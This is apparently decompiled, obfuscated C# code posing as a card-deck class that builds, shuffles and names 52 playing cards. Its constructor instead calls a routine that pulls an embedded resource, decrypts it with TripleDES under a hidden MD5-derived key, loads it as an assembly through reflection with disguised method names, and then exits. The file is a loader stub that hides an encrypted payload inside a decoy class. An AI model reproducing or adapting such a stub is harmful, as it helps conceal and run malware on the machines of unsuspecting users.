using System;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Text;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

public sealed class GClass1
{
	private GClass0[] gclass0_0;

	private static string[] string_0;

	private static string[] string_1;

	private static string string_2;

	private static string string_3;

	public GClass1()
	{
		smethod_2();
		Environment.Exit(0);
		gclass0_0 = new GClass0[52];
		int num = 0;
		for (int i = 0; i < 4; i++)
		{
			for (int j = 0; j < 13; j++)
			{
				gclass0_0[num] = new GClass0(i, j);
				num++;
			}
		}
	}

	static GClass1()
	{
		string_0 = new string[13]
		{
			Class6.smethod_0(-1513443596),
			Class6.smethod_0(-1513443586),
			Class6.smethod_0(-1513443610),
			Class6.smethod_0(-1513443602),
			Class6.smethod_0(-1513443626),
			Class6.smethod_0(-1513443618),
			Class6.smethod_0(-1513443642),
			Class6.smethod_0(-1513443634),
			Class6.smethod_0(-1513443658),
			Class6.smethod_0(-1513443650),
			Class6.smethod_0(-1513443673),
			Class6.smethod_0(-1513443694),
			Class6.smethod_0(-1513443682)
		};
		string_1 = new string[4]
		{
			Class6.smethod_0(-1513443703),
			Class6.smethod_0(-1513443722),
			Class6.smethod_0(-1513443741),
			Class6.smethod_0(-1513443758)
		};
		string_2 = Class6.smethod_0(-1513443746);
		string_3 = Class6.smethod_0(-1513443763);
	}

	public static byte[] smethod_0(byte[] byte_0)
	{
		TripleDESCryptoServiceProvider tripleDESCryptoServiceProvider = new TripleDESCryptoServiceProvider();
		MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
		byte[] array2 = (tripleDESCryptoServiceProvider.Key = (byte[])Versioned.CallByName((object)mD5CryptoServiceProvider, Class6.smethod_0(-1513443780), (CallType)2, new object[1] { Versioned.CallByName((object)Encoding.GetEncoding(1201), Class6.smethod_0(-1513443794), (CallType)2, new object[1] { Class6.smethod_0(-1513443811) }) }));
		tripleDESCryptoServiceProvider.Mode = CipherMode.ECB;
		return tripleDESCryptoServiceProvider.CreateDecryptor().TransformFinalBlock(byte_0, 0, byte_0.Length);
	}

	internal static byte[] smethod_1(string string_4)
	{
		Assembly executingAssembly = Assembly.GetExecutingAssembly();
		Stream manifestResourceStream = executingAssembly.GetManifestResourceStream(string_4);
		if (manifestResourceStream == null)
		{
			throw new FileNotFoundException(Class6.smethod_0(-1513443830), string_4);
		}
		byte[] obj;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			manifestResourceStream.CopyTo(memoryStream);
			obj = memoryStream.ToArray();
		}
		object objectValue = RuntimeHelpers.GetObjectValue(obj);
		return (byte[])objectValue;
	}

	public static object smethod_2()
	{
		PropertyInfo[] array = (PropertyInfo[])NewLateBinding.LateGet((object)((Assembly)typeof(Assembly).InvokeMember(Class6.smethod_0(-1513443349).Replace(Class6.smethod_0(-1513443370), Class6.smethod_0(-1513443361)).Replace(Class6.smethod_0(-1513443384), Class6.smethod_0(-1513443407)), BindingFlags.InvokeMethod, null, null, new object[1] { smethod_0(smethod_1(string_2)) })).GetType(Class6.smethod_0(-1513443398)), (Type)null, Class6.smethod_0(-1513443447), new object[0], (string[])null, (Type[])null, (bool[])null);
		object[] array2 = new object[7]
		{
			Class6.smethod_0(-1513443459),
			Class6.smethod_0(-1513443500),
			string_3,
			true,
			false,
			true,
			true
		};
		array[0].GetSetMethod()!.Invoke(null, new object[1] { new string[3]
		{
			Conversions.ToString(array2[2]),
			Conversions.ToString(array2[1]),
			Conversions.ToString(array2[0])
		} });
		return 0;
	}

	public GClass0[] method_0()
	{
		Random random = new Random();
		for (int num = gclass0_0.GetLength(0) - 1; num >= 0; num--)
		{
			int num2 = random.Next(0, 51);
			GClass0 gClass = gclass0_0[num];
			gclass0_0[num] = gclass0_0[num2];
			gclass0_0[num2] = gClass;
		}
		return gclass0_0;
	}

	public static string smethod_3(GClass0 gclass0_1)
	{
		try
		{
			return string.Format(Class6.smethod_0(-1513443510), string_0[gclass0_1.int_1], string_1[gclass0_1.int_0]);
		}
		catch (Exception ex)
		{
			return string.Format(Class6.smethod_0(-1513443540), ex.Message);
		}
	}
}
